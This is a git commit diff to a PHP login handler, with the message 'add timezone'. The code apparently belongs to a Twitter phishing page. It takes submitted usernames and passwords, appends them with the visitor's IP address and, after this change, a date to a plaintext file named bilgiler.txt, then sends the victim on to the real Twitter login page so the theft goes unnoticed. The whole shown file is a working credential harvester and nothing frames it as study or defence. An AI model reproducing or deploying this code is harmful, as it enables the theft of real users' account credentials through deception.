28fd27562155fd20050a70ca31dd39a97d6e7b46
aydemir98 <aydemirmm111@gmail.com>
2022-01-14 07:43:06 +0300

    add timezone

--- login.php
+++ login.php
@@ -1,13 +1,18 @@
 <?php 
 
+date_default_timezone_set('Europe/Istanbul');
+
 $kullaniciadi = $_POST['Username'];
 $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
+$tarih = date('d.m.Y - H:i');
 
 $dosya = fopen ("bilgiler.txt" , 'a'); 
-$yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n";
+$yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
+
+
 
 header("Location: https://twitter.com/i/flow/login"); 
 die();
